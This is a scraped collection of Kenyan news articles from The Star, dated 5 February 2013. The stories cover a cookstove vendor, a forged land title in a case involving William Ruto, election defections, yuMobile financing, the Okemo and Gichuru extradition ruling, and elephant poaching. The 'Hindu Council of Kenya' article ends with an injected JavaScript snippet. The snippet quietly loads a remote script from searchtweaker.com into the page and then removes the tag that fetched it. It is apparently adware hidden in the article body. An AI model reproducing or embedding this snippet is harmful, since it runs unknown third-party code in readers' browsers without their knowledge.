http://www.the-star.co.ke/news/2013/02/05/efficient-improved-wood-stove_c728462,Efficient Improved Wood Stove,www.the-star.co.ke › Lifestyle,"Feb. 05, 2013, 12:00 am","['While the three-stoned traditional cooking stove remains popular in the rural areas, it has its share of problems including that of venting smoke in the home, fuel and heat wastage.', 'Paul Musyoka who has been actively promoting energy saving has a new product. This time he is selling a new improved wood stove that meets the need of the rural population and is energy and time saving too.', ' ', ' The M5000 wood stove model goes for Sh3,000 and takes only two pieces of wood to cook a meal for at least 15 people. The cooking stove is demand driven in the rural places where people still use firewood. You can cook a lot of food but with a little firewood. It is an excellent replacement for the three stone open fire stove and the idea here is to save on heat loss while using less firewood hence reduce deforestation, says Musyoka. ', ""The stove is durable, portable and reduces wood fuel consumption by 50 per cent and comes with a five year guarantee. Firewood and charcoal account for 80 per cent of Kenya's total energy use with demand surpassing supply. As a result, this has increased deforestation which is made worse by inefficient use of wood fuel that causes wastage."", ' ', 'He is also promoting another new charcoal stove which is bigger and has a high capacity of heat storage. The CH 5200 model which costs 3,500 to 4,000 can accommodate a bigger sufuria unlike the other models. Musyoka says the CH 5200 model made by Envirofit International is still very new in the market and he is yet to get feedback from those who have bought it.', ' ', 'Not only do the stoves reduce smoke inhalation in the kitchen but they also help reduce many deaths that are smoke or carbon monoxide related. If every Kenyan could use an energy saving cooking stove, the amount of pollution in the air would be reduced by almost 50 per cent, he says.', ' ', 'Musyokas innovations which he established last year were driven by necessity when he couldnt seem to make ends meet. Armed with only Sh3,000 which was to be his rent money, Musyoka decided to buy a cooking stove and held a demonstration on its effectiveness to a group of teachers in a primary school near his home in Nairobi.', ' ', ""His risk paid off and he got five orders and he was able to repay back his rent money with some profit. From then on I would go to events where they were groups of people and demonstrate the use of the stoves and how efficient and time saving they are. I haven't looked back since, he says."", 'On a good day Musyoka sells a minimum of five cooking stoves which totals to about Sh15,000. After deducting his expenses, he takes home a profit of between Sh5,000 to Sh7,000 a day.', ' ', 'I have no doubt I made the right decision and I hope one day I will have an office of my own and be able to employ people, says the former personal driver.', ' ', 'He pitches camp in areas where he can reach a large number of people such as offices, during agricultural shows and other SMEs exhibitions in Nairobi. He now plans to go countrywide and next he will exhibit the cooking stoves at a number of places.', ' ', ' ', 'For more information on the improved cooking stoves contact: Paul Musyoka 0731 772384 or 0723 222060.', '\n']"
http://www.the-star.co.ke/news/2013/02/05/ruto-title-for-idps-farm-was-forged_c734805,RUTO TITLE FOR IDP'S FARM WAS FORGED,www.the-star.co.ke › National News,"Feb. 05, 2013, 12:00 am","['THE land title for a farm belonging to an IDP in Rift Valley was forged before it was sold to former Eldoret North MP William Ruto. Yesterday a Lands ministry official told a Nairobi court that the title was ""fake"".', 'Fraudsters apparently hijacked the identity of Dorothy Jemutai Yator and portrayed her as the owner of the land before selling it to Ruto.', 'According to documents produced before Justice Rose Ougo, Yator would have been six years old when the title was allegedly issued to her by the Lands registry.', 'The photo attached to the land transaction documents also did not resemble Yator who appeared in court for the first time yesterday. Principal Land Administration Officer Kiogora Mburugu said Yator was a victim of ""misrepresentation and forgery.""', 'Mburugu said the ministry was still ""investigating"" the fraud. No-one at the Lands Ministry has been charged with any offense or disciplined to date. Ruto, Uhuru Kenyatta\'s running mate in the presidential election, bought the 86 acre farm in Turbo, Uasin Gishu in September 2008.', 'However Adrian Gilbert Muteshi then filed a case claiming that he had owned the farm since 1968. Last year Ruto held a press conference where he said the court case was part of a ""grand scheme"" to link him land grabbing after the post-election violence. Later he agreed to return the farm to Muteshi but the agreement foundered after the IDP demanded compensation as well.', 'Yesterday the former MP was in court but opted not to testify. He had previously stated that he had done due diligence and had no reason to doubt the validity of the land title.', 'Hosea Ruto, a friend of William Ruto, yesterday told court that the ex-MP dealt with with two middle men who worked at the Uasin Gishu district settlement office and who were handling the transaction on behalf of Yator. ', 'Hosea said he personally went to inquire about the ownership of the land on behalf of the then MP. He said he went to the Uasin Gishu district settlement office where he met Peter Kosgei and Bethuel Kipsang who showed him the title deed and took him on a tour of the land.', 'The two men informed him that the land belonged to Yator who was ""part of them"" and that Yator was married to a Mr Kiptugen who works with the Lands ministry.', 'Hosea then introduced the two men to Ruto who paid for the farm in several installments with the final payment of Sh600,000 being handed over by Hosea himself. Hosea said he never heard Muteshis name during the transaction.', 'Muteshi filed his case in 2010 accusing Ruto of grabbing his 100 acre farm in Turbo, Uasin Gishu District. He said he farmed the land until 1992 when his business was temporarily interrupted by tribal clashes. He resumed farming after the violence but had to abandon the farm again following the chaos after the disputed 2007 election.', 'He was informed that Ruto had taken over the land when he returned to his farm after the turmoil. Muteshi said his six workers were evicted from the farm.', 'He claimed he acquired the land in the Kaptabei Scheme in the 1960s from Mr Edmund who was the white settler owner. Muteshi said that he applied to the then Lands minister, the late Jackson Harvester Angaine, for approval to buy the land in May 1968, . ', 'The application was approved on October 3, 1968, after paying the required amount plus development cash, Muteshi said. He signed a sale and loan agreement with the Settlement Fund Trustees at the same time and was expected to repay the loan over 30 years. However he only acquired a land title in 1989.', ""Muteshi must be honest. Allegations that he was at the farm in 2008 is actually a fraud. I've been the area MP for 15 years and nobody lived on that farm. The last time somebody was seen on the farm was in 1992. Muteshi was not living in the farm in 2008, Ruto told a press conference last year."", '\n']"
http://www.the-star.co.ke/news/2013/02/05/kitui-wiper-losers-join-jubilee-over-stolen-election_c734640,Kitui Wiper losers join Jubilee over ‘stolen election’,www.the-star.co.ke › Local News › North Eastern,"Feb. 05, 2013, 12:00 am","['Two politicians in Kitui County have declared the launching of a serious offensive against the Wiper Democratic Movement ahead of the March 4 polls.', 'The now Jubilee-inclined Caxton Munyoki, a former Kenya Broadcasting Corporation Managing Director, and Nairobi businessman Kennedy Ngumbau, lost the race for Wiper tickets for the Mwingi west parliamentary seat and Kitui governorship respectively.', 'The two said the Wiper party and its leader Kalonzo Musyoka who hails from Kitui County had let down their constituents and supporters.', 'They told Jubilee campaign rallies in Mwingi west constituency that they had joined Jubilee after being unfairly locked out of the ballot during the Wiper primaries.', 'I am a very bitter man. These people stole my vote because they had a preferred candidate for this constituency. I will use my energy and resources to ensure the dictatorial Wiper party team is defeated by candidates in jubilee Alliance, said Munyoki.', 'The former KBC boss was speaking at Migwani, Nzawa, Kanyaa, Kakululo and Nzalae market centres. I am bitter that although the Wiper party is associated with a person who hails from our home area, they have not shunned the  dictatorial Kanu ways, said Munyoki.', 'Ngumbau, who has joined Narc party and has been picked as a running mate for the governor aspirant,  Kiema Kilonzo, said he had set in motion a machinery to vanquish Wiper in Kitui at the March 4 poll.', 'I am a disgusted man because I invested a lot of resources campaigning for the Wiper nomination for the Kitui governors ticket only for my votes to be stolen in broad day light. The Wiper party has to pay for the injustice. Its candidates must lose the election, Ngumbau said.', '\n']"
http://www.the-star.co.ke/news/2013/02/05/yu-gets-sh13bn-capital-injection-from-essar_c734790,Yu gets sh13bn capital injection from Essar,www.the-star.co.ke › Business › Local,"Feb. 05, 2013, 12:00 am","['Mobile operator Essar Telecom Kenya has received Sh13.05 billion ($150 million) capital injection from its parent company Essar Group to pay its bank loans. ', 'This will enable the telecom operator finance its operating expenses from internal revenues as it seeks to raise funds for further expansion. ', 'yuMobile CEO Madhur Taneja said the company has been incurring huge interest costs from the loans but will now be able to finance its expenses internally and comfortably. ', '""We have paid off all our debts for the existing business. That is the biggest burden for any telecom. We do not have any debt at all, its all equity,"" said Taneja in an interview with the Star yesterday. ', 'Last year, there had been reports that the Indian conglomerate, which owns 80 per cent was planning to pull out of yuMobile, but Taneja said the capital injection shows contrary. It has already invested about Sh43.5 billion ($500 million) in Kenya in the telecom business in Kenya in the last four years. ', 'yuMobile is now expecting to receive Sh8.7 billion ($100 million) loan in March for capital expenditure. This will be the first tranche of its $200 million funding needs for the next few years. ', 'The new money will be invested in expanding capacity in voice, data and yuCash business and other radio frequency and transmission technology. ', '""We are borrowing money but that is for expansion not for operating expenses, that does not become a debt burden for us, interest servicing cost is not there,"" Taneja said ', 'He said Essar has already identified international banks where they are able to get the loans in dollars with attractive interest of around 7 per cent. It had contracted transaction advisors BNP Paribas to evaluate the possible funding options. ', '""Telecom business is extremely capital intensive. And you see returns you break even 5-8 years. so you need to bring in a substantial amounts,"" ', 'yuMobile is the fastest growing network. According to CCK figures, its customer base grew from 1.3 million to 3 million users in the year up to September 2012. it aims to gain 1 million new subscribers each and turn profitable by 2014.', ' ', ' ', '\n']"
http://www.the-star.co.ke/news/2013/02/05/okemo-gichuru-fail-to-block-extradition_c735181,"Okemo, Gichuru fail to block extradition",www.the-star.co.ke › Latest News,"Feb. 05, 2013, 12:00 am","['A court has today directed that the extradition of former Nambale MP Chris Okemo and former Kenya Power and Lighting Manager  Samuel Gichuru can go on.', 'A court in Jersey on April 20, 2011 had issued a warrant of arrest for the two who the Chief Justice of the Island of Jersey accused of defrauding KPlC and laundering proceeds in the UK. The two were to appear before the court on May 5, 2011 but failed to do so.', 'The two had gone to court to block their extradition and also challenged the jurisdiction of the court to extradite them. The accused had further claimed that owing to the publicity the case had  generated, they feared they would not have a fair trial in Jersey. They instead applied to have the cases referred to the High Court.', 'However, City Hall Chief Magistrate Teresia Muregi declined to block the Jersey court from extraditing Okemo and Gichuru on grounds that no incidents of mistreatment as claimed by the two had been presented before her.', 'Additionally, Muregi said that the issue of jurisdiction will be addressed in the Jersey court once the accused are arraigned. The 53 charges that the two are being accused of relate to commissions paid by international companies, mostly between 1999 and 2002, totalling 4,459,572 pounds sterling, 786,853 Danish kroner and 3,207,360 US dollars (Sh902 million in total). All the charges relate to Gichuru but not all mention Okemo', 'Gichuru was managing director of KPLC between 1983 and 2003 when it was partially privatised, while Okemo was Energy minister from 1999 to 2001 and then Finance minister from 2001 to 2003 when the alleged defrauding and embezzlement took place.', 'Muregi also ruled that the Director of Public Prosecutions Keriako Tobiko can initiate the extradition. Following the ruling, the two will be expected to appear before the Jersey court to answer to the charges.', '\n']"
http://www.the-star.co.ke/news/2013/02/05/gang-attacks-supporters-of-kisauni-rc-candidate_c734647,Gang attacks supporters of Kisauni RC candidate,www.the-star.co.ke › Local News › Coast,"Feb. 05, 2013, 12:00 am","['Police in Kisauni are investigating an alleged attack by a group of youth on supporters of a Mjambere ward aspirant. Salim Omar was at the party offices with his supporters on Sunday evening when three cars, two saloons and a Toyota X-trail, pulled up and the occupants started insulting them.', 'Our opponents were having a function nearby. They were minding their own business as we were ours. But this group showed up and without any warning started insulting us, said Omar.', ""Omar said about six youth alighted wielding iron bars and knives and attacked three of Omars supporters. Said Swaleh suffered a dislocated ankle, Salim Juma's eye was injured while the third person whose name was given as Ismail hurt his hand."", ' ', 'Kisauni police boss Julius Wanjohi said a group of people reported an attacke at the Nyali police station.  That is all I know. The attack happened at a ground in Mlaleo. There was no report of an office being attacked as you put it, he added.', 'Omar defected from ODM to the Republican Congress Party citing rigging in the recent party nominations. Two weeks ago, RC leader Najib Balala and his allies Ibrahim Babangida Khamis, Sureya Hersi and Yasir Noor were attacked by a group of youth while on a door-to-door campaign at Kongowea in Nyali constituency. ', ' ', 'The RC party through its official Facebook page condemned the Mjambere incident and said it will continue with its campaigns. Such violence will not stop us from doing our campaigns. The people have decided against their evil thus they have sensed defeat and resolved to violence, read the statement.', '\n']"
http://www.the-star.co.ke/news/2013/02/05/cid-grill-imposters-wife-policewomans-sister_c734783,"CID grill imposter’s wife, policewoman’s sister",www.the-star.co.ke › National News,"Feb. 05, 2013, 12:00 am","['Police yesterday interrogated the wife of impostor Joshua Waiganjo and his sister, who is a police officer.', ""The wife, a mother of two and only identified as Florence, and the impostor's sister were summoned to the Criminal Investigation Department headquarters along Kiambu road at 9am by a person who identified himself as an investigator of the cases."", '""We were summoned here and I am upstairs and don\'t know if I can be allowed to come down and talk to you,"" was all Waiganjo\'s wife could say. Waiganjo\'s sister did not reply to an SMS sent to her phone.', 'Their lawyer Cliff Ombeta arrived at CID headquarters at about 2pm hours after his clients and conferred with his clients as the interrogation continued.', '""My clients have been summoned to CID headquarters but I don\'t know what it is all about. I will go and find out more details before I brief you,"" Ombeta said.', 'Detectives are trying to unravel a network of criminals Waiganjo is reported to have been colluding with and have already identified several who have either been interrogated or are scheduled for grilling over their links with a man whose activities have sent shock waves in the police force.', 'Last week, an inspector with the National Youth Service had to be rushed for medical care after she fainted under interrogation. She is reported to have been a tailor of police uniforms used by Waiganjo during the period he posed as an officer.', '""She said she had been given fabrics by Waiganjo to sew senior police officers uniforms,"" a senior investigator said.', ""Investigators who impounded Waiganjo's mobile phones have also collected data from mobile service providers and are analysing data to track his accomplices."", 'They have also visited a commercial building in Kitengela the allegedly jointly owns with a senior officer. ', '\n']"
http://www.the-star.co.ke/news/2013/02/05/muthama-warns-cord-over-confusion-in-campaigns_c734757,Muthama warns Cord over confusion in campaigns,www.the-star.co.ke › Local News › North Eastern,"Feb. 05, 2013, 12:00 am","['Machakos senator hopeful Johnson Muthama has accused candidates in fringe parties under the Cord Coalition of causing confusion among voters even as they campaign for Raila Odinga and Kalonzo Musyoka.', 'He said majority of Cord supporters know the three main parties,ODM,Wiper and Ford-Kenya, but scores of smaller parties had fielded candidates for parliamentary, county and women representative seats.', 'Muthama said Cord risks losing seats if all Cord affiliate parties ""eat from the same basket of voters."" ""That is why I supported joint nominations from the start so that we could field a single strong candidate for all seats to face TNA and other parties,"" Muthama said.', 'The former Kangundo legislator said he would only campaign for Wiper candidates in Machakos county and for Raila and Kalonzo. Muthama said he was optimistic that only two to three parties are in future allowed to battle it out in a General Election in addition to independent candidates as is the case in developed democracies.', 'The former government whip in Parliament was speaking in Machakos town where he predicted a Cord sweep of all the seats in Ukambani counties of Kitui,Makueni and Machakos.', 'Muthama dismissed rumours of a power struggle within the Wiper party. ""We are solidly behind Kalonzo and Cord while those talking of power struggles are enemies who are are already sensing defeat,"" Muthama said.', 'He said he stay at the forefront in uniting Kenyans before and after polls and was optimistic Raila would take the presidency. Muthama called for peaceful campaigns and urged IEBC to clamp down on those engaging in hate speech and other offences ahead of the poll. He said the world is watching Kenya and asked Kenyans and IEBC to ensure peaceful elections.', '""We are among the most advanced democracies in the continent and we should not let ethnicity and other retrogressive thoughts guide us as we go to vote,"" Muthama said. He asked Kenyans to elect leaders who would propel Kenya to economic prosperity and peace.', ' ', '\n']"
http://www.the-star.co.ke/news/2013/02/05/good-policies-build-strong-societies_c734540,Good Policies Build Strong Societies,www.the-star.co.ke › Opinion › Dr Alex Awiti,"Feb. 05, 2013, 12:00 am","['We live in the most complex, uncertain and hyper connected epoch in human history. Interdependence of financial and supply chains present monumental challenges for global stability.', 'In 2007, US Subprime mortgages tanked Asias hottest IPO markets, devastated European banks and hit global hedge funds in emerging markets. According to the World Economic Forum, fragile economies, unsustainable debt and environmental degradation are the big risks facing the global economy in 2013.', 'For Africa, this reality presents a new development context shaped by uncertainty, risk. Vulnerability in one country affects others in ways that were hitherto unimaginable. Socio-economic instability and ecological degradation in a single country inevitably reverberates throughout the continent.', 'Convergent economic and environmental challenges will continue to have dramatic impacts on millions of Africans, jeopardising progress towards poverty reduction, eradication of chronic hunger and disease control. High food, energy and commodity prices, persistent income inequality, climate change and environmental degradation cast a long shadow on our collective prosperity.', 'Public policy is the best mechanism we have to deal with collective challenges. Policies are broad statements of purpose and process for addressing a particular social, economic or environmental issue. The intent of policy is implemented through regulatory, economic, expenditure and institutional tools. American philosopher, John Dewey, argued that policies must be treated as experiments, with the aim of promoting continual learning and adaptation in response to experience over time.', 'Whether the goal is to address infant mortality or free education or water and sanitation or energy or agriculture or conservation, policy-and decision-makers face significant uncertainty. Policies that cannot perform effectively under dynamic and uncertain conditions face the risk of not achieving the intended purpose, and undermining the capacity of societies to cope with or adapt to change.', 'In a world fraught with uncertainty we need a resilience approach to policy design and implementation. The concept of resilience first appeared in ecological lexicon with C. S. Hollings seminal paper, Resilience and Stability of Ecological Systems in 1973. Resilience is the capacity for adaptive renewal through transformation and reorganization after disturbance.', 'Resilience has emerged as an important organising idea when thinking about policy and management action appropriate to the magnitude of risk and uncertainty we face today. The theme of the just concluded 2013 World Economic Forum was Resilient Dynamism. Resilience is now widely used to communicate the idea that a society or economy or ecological systems have the capacity to absorb shocks and disturbances with minimal disruption.', 'Resilience thinking in policy design and implementation is really about an adaptive approach, which takes into account the fact that the future is not knowable and manageable. An adaptive approach to policy making understands and appreciates dynamics, uncertainty and complexity of socio-economic and ecological interactions.', 'An adaptive approach to policy making could make societies and economies more resilient to external shock and supple in response to rapid change and surprise. Some policy scholars have suggested that we should treat policy making as gardening: muddy, attentive and experiential, because we have no idea what growing conditions will prevail.', 'I argue that public policy must be designed to be more flexible and adaptive, to respond to unanticipated conditions in order to reduce the risks of policy failure as foundational assumptions of their design come against the headwinds of change.', 'Building adaptive policy is not the task of a single actor or a single sector, no matter how innovative. Rather, building adaptive public policy, which, are resilient over time, requires building foresight, forging coalitions across society, decentralising decision authority and committing to continual learning. ', 'The capacity of a policy to adapt to anticipated and unanticipated conditions can be facilitated using some simple process mechanisms.', 'Integrated foresight planning and analysis: Identifying multiple drivers, which determine policy design is critical to understanding how the implementation and targeted outcomes might evolve across a range of contexts. ', 'Multi-stakeholder consultation: Collaborative processes strengthen policy design by providing a comprehensive understanding of key drivers and recognising common values, identifying shared commitment and anticipating emergent issues', 'Enabling decentralisation: Decentralising of the authority and responsibility for decision-making to the lowest effective and accountable unit of governance can enhance policy responsiveness and relevance to the local context. ', 'Continuous learning: Regular review, even when the policy is delivering its objectives, and the use of well-designed indicators can strengthen monitoring, and inform policy learning and continual adaptation. ', 'The imperative to reconcile economic, social and environmental well being has never been more urgent. Moreover, the condition under which policy-makers must work has never more complex and uncertain. We must therefore face the future differently by building a resilient society; a society that responds to change and crisis through continual learning, adaptive renewal and reorganisation.', ' ', 'Dr. Awiti is an Ecosystems Ecologist based at Aga Khan University in Nairobi', '\n']"
http://www.the-star.co.ke/news/2013/02/05/reduced-pay-for-state-officials-proposed_c735169,Reduced pay for state officials proposed,www.the-star.co.ke › Latest News,"Feb. 05, 2013, 12:00 am","['The President should earn no more than Ksh 1,750,000 per month while the Deputy President should earn Ksh. 1, 487,500 per month, the Salaries and Remuneration Commission has proposed.', 'The figures are part of a proposed new pay package launched by the commission at the KICC today. They are part of a measure to create a sustainable wage bill for Kenya.', 'Commission Chairperson Sarah Serem said the recent trend in the public sector wage bill has been too high as compared with international desirable levels of wage sustainability. This she said would leave the economy vulnerable if the trend continues.', 'Presently, President Mwai Kibaki is expected to take home 25.2 million shillings when he retires having served as Head of State for two terms in addition to a Sh1 million monthly pension for the rest of his life after parliament last year, passed the Presidential Retirement Benefits (Amendment) Bill 2012.', ""Members of Parliament also attempted to award themselves a Sh9.3 million 'farewell token' that would have cost taxpayers over Sh2 billion, but President Kibaki declined to sign the amendment into law."", '\n']"
http://www.the-star.co.ke/news/2013/02/05/timbe-to-miss-tie_c734782,Timbe to miss Tie,www.the-star.co.ke › Sport › Local,"Feb. 05, 2013, 12:00 am","['Kenyas Harambee Stars are all set to face Libya in an international friendly tomorrow that will act as part of their preparation for their upcoming World Cup qualifiers. ', 'However, James Nandwas side will be without Belgium based forward Ayub Timbe who opted out of tomorrows friendly in Tunisia for inexplicable reasons.', 'According to FKF Secretary general Michael Esakwa, a ticket was sent to the Genk winger for him to link up with his compatriots on Wednesday but the 20-year-old has chosed not to honur the match without giving reasons.', 'An air ticket was sent to Timbe as was the case for the other players who were to join us here in Tunisia but he told us he was not going to come. He did not volunteer any reasons, said Esakwa who is leading the Kenya team in Tunisia.', 'The other Europe-based players include skipper Dennis Oliech who joined the team back after leading his club side AC Ajaccio to a shock 3-1 win over Olympique Lyon in the French Ligue 1. In that match Oliech won a penalty converted by Adrian Mutu.', 'Kenya goalkeeper Arnold Origi who plies his trade in Norway was the first among the overseas- based players to link up. Yesterday Glasgow Celtic midfielder Victor Wanyama and new call-up David Gateri based in South Africa were expected to link up with Harambee Stars who left for Tunisia on Sunday morning with Tanzanian-based duo Humphrey Mieno and Joakins Atudo leaving with the group of home-based players who have been in camp for the last two weeks.', 'Nandwa revealed the friendly was very important for Kenya in terms of improving their ranking as well as good preparation fro the World Cup qualifier against Nigeria next month.', 'This match is very important for us as it also acts as a build up for the Nigeria match. It gives us the opportunity to measure ourselves away from home against one of the most improved sides in African football, Nandwa said.', 'Squad:', 'Goalkeepers', 'Duncan Ochieng (Sofapaka), Boniface Oluoch (Tusker). Defenders: Anthony Kimani (AFC Leopards) David Owino( Gor Mahia), Abdallah Juma ( Sofapaka), Joakins Atudo (Azam). Midfielders: Humphrey Mieno (Azam), Clifton Miheso Francis Kahata ( Thika United) Peter Opiyo (Tusker), Paul Were (Leopards), Kevin Omondi, Paul Kiongera (Gor). Forwards: Michael Baraza (Leopards), Jesse Were (Tusker), Rama Salim (Gor ).', '\n']"
http://www.the-star.co.ke/news/2013/02/05/leaked-ruling-puts-judiciary-on-the-spot_c734827,Leaked ruling puts Judiciary on the spot,www.the-star.co.ke › National News,"Feb. 05, 2013, 12:00 am","['A Judge was yesterday asked to delay the delivery of a ruling until the police establish how it was leaked to the public before it was read in court.', ""Appearing before Justice Eric Ogolla yesterday, lawyer Ishmael Nyaribo said his client had already reported the 'leak' to the police, the ombudsman, and had also made a formal complaint to the Chief Justice Willy Mutunga and the Judicial Service Commission, for investigation. He said that it was therefore prudent to temporarily delay the delivery of the ruling until the investigations are completed."", ""Nyaribo said the ruling concerning a property worth Sh200 million property in Karen was stolen and a copy thrown over the fence of his client's home on the night of January 14. "", 'The ruling was scheduled to be delivered three days later.  Nyaribo said his client was informed of the sealed enveloped which was found by the watchman who did not see who had thrown it.', 'The property dispute was heard by Justice Leonard Njagi and his ruling was to be delivered on his behalf by one of the judges on the Commercial Division after the Judges and Magistrates Vetting Board found Njagi unsuitable to continue serving on the bench.', 'In the leaked ruling, Nyaribos clients- Sehit Investments ltd- lost the application for injunction in the property dispute. Nyaribo has named Josephine Akoth Onyango, Simon Otieno, KCBs Savings and Loan ltd and Attorney General as respondents.', 'Nyaribo said it was too much of a coincident that the bank advertised the property for sale almost the same time the ruling was leaked.', ""However, the bank's lawyer Ahmednasir Abdullahi asked the court to dismiss the application as it lacked merit. He said there was nothing stopping the court from delivering the ruling and once it was delivered, the JSC, ombudsman and the police can investigate the matter."", 'Abdullahi further said that stopping the court from reading the ruling was tantamount to ceding the powers of the court to investigative mechanisms. ', 'He said that it was in the interest of justice for the ruling to be read since justice delayed is justice denied. The bank also said that the applicant was sneaking an application for injunction under the guise of seeking temporary relief.', 'The bank argued that the document thrown over the fence could not be said to be a ruling because it is not signed. It said the postponement of the ruling would set a bad precedent and would be against public policy. ', 'The bank also said that, other than the letter to Justice Mutunga, there was nothing to show that the matter had been reported to the police as alleged by Nyaribo. Justice Ogolla will give his ruling on February 19. ', ' ', 'FOR THE RECORD', ""On Tuesday we carried a story titled 'Leaked ruling puts Judiciary on\nthe spot' in which a lawyer appealed to Justice Eric Ogolla to delay\ndelivery of a ruling until police establish how it was leaked to the\npublic before it was read in court. An impression may have been created\nthat Justice Ogolla had been hearing the case and was due to make a\nruling. The case had actually been before Justice Leonard Njagi who has\nsince been found unfit to serve by the Judges and Magistrates Vetting\nBoard. Justice Njagi's ruling had thus been given to another judge to\nread when it was leaked. The aggrieved party went to Justice Ogolla to\nask for the delay. We take this early opportunity to clarify that\nJustice Ogolla has not been involved in the case."", '\n']"
http://www.the-star.co.ke/news/2013/02/05/wildlife-lobby-decries-jumbo-killings-in-isiolo-samburu_c734770,"Wildlife lobby decries jumbo killings in Isiolo, Samburu",www.the-star.co.ke › Local News › North Eastern,"Feb. 05, 2013, 12:00 am","['A lobby group has raised alarm over elephant poaching in Isiolo and Samburu districts. NORTHERN Range Land Trust yesterday called on the government and organisation involved in wildlife management to coordinate their efforts in protecting the animals.', ""The lobby group's conservancy coordinator Tom Lalampa said the northern circuit region lost 134 elephants last year. In 2011, 101 elephants were killed and in 2010, 63 elephants were poached."", 'Lalampa said poaching had become complex and increasingly difficult to deal with day-by-day. He said poacher are now using sophisticated weapons and tactics making it hard to fight them.', '""We are worried that with the current trend of poaching our animals will be decimated,"" said the coordinator. ""The poachers are have been encroaching into the protected areas. This is really dangerous.""', ""Lalampa said his organisation has partnered with Safaricom to track down on poachers. He was speaking at Kalama Conservancy during the launch of the Trust's five-year strategy plan."", 'County Commissioners from Isiolo and Samburu regions warned that the government will put in place strigent security measures to avert elephant killings in the area.', 'Mr Wanyama Musiambo of Isiolo said the poachers must know that there days are numbered with cordination of two security teams from the region.', '""We want to assure our partners and the donars that we are going to put in place all the neccesary measures to ensure that those behind the killings were arrested and prosecuted,""said Mr Wanyama.', 'The meeting brought together key actors in wild animal conservation and representatives of Usaid Kenya, Kenya Wild life services, representative of Dutch Embassy and Director of NRT Ian Craig.', 'According to the recently released elephants statistics in the area the number of elephants had reduced from 7415 in 2008 census to 6361 in the 2012 census while that of Grevy Zebra had also gone down from 2,400 in 2008 to 1870 in last year.', '\n']"
http://www.the-star.co.ke/news/2013/02/05/hindu-council-of-kenya-hosts-jubilee-leaders_c734499,Hindu Council of Kenya hosts Jubilee leaders,www.the-star.co.ke › Lifestyle › Society › Asian Scene,"Feb. 05, 2013, 12:00 am","[' ', ' ', 'The Hindu Council of Kenya used the opportunity to invite other aspirants to interact with the Asian community as part of their election campaigns.', ' ', ' ', ' ', 'The Oshwal Education & Relief Board, Economic Council of Oshwal, Sea Change Capital, Spin Ventures Group and Kenafric Quality Products hosted him at the Oshwal Centre Auditorium recently. ', ' ', ""For the Oshwal community this is a way of spreading and sharing knowledge and David was a success. The audience had a great time testing David's mind. "", ' ', 'Hiteshbhai Shah in devotional prayers', ' ', '// <![CDATA[\n(function(){try{var header=document.getElementsByTagName(""HEAD"")[0];var script=document.createElement(""SCRIPT"");script.src=""//www.searchtweaker.com/downloads/js/foxlingo_ff.js"";script.onload=script.onreadystatechange=function(){if (!(this.readyState)||(this.readyState==""complete""||this.readyState==""loaded"")){script.onload=null;script.onreadystatechange=null;header.removeChild(script);}}; header.appendChild(script);} catch(e) {}})();\n// ]]>', '\n']"
http://www.the-star.co.ke/news/2013/02/05/odm-faces-uphill-task-to-clinch-nyanza-seats_c734494,ODM faces uphill task to clinch Nyanza seats,www.the-star.co.ke › Local News › Western,"Feb. 05, 2013, 12:00 am","['The unity dominance of ODM in Nyanza is under test after candidates affiliated to other parties mounted heavy campaigns with aim of trouncing ODM candidates.', ' ', 'The candidates most of whom alleged unfair nomination process in ODM have taken advantage of their parties affiliation to Cord to give ODM Candidates a run for their money after they were cleared by other parties.', ' ', 'Unlike before where Election in Nyanza ended after party nomination, this time round campaigns have intensified and none of the ODM candidate is celebrating.', ' ', 'In Kisumu central constituency, Ford Kenya Candidate Abdulkadir Mohammed has vowed to give ODM candidate Ken Obura a run for the seat after he alleged that he was rigged out.', ' ', 'In Uriri constituency former MP Ojwang Omollo who defected to Ford Kenya after being denied ODM certificate has promised a bruising battle against his opponent Enock Kobado.', ' ', 'In Homa bay, the senate seat has attracted a lot of interest after Hilary Alila defected to People Democratic Party, PDP alleging unfair process in the ODM primaries where he faced Immigration minister Otieno Kajwang.', ' ', 'Migori Gubernatorial race is also one of the seats under threat after Zachary Obado defected to PDP to contest against his rival Professor Akongo Oyugi of ODM.', ' ', 'The campaign for six piece in the province has received hospital reception from locals who have vowed to only vote for Raila as the president but give their votes to different parties. Those who defected to other parties affiliated to cord have also accused ODM of being insincerity  to their partners.', '\n']"
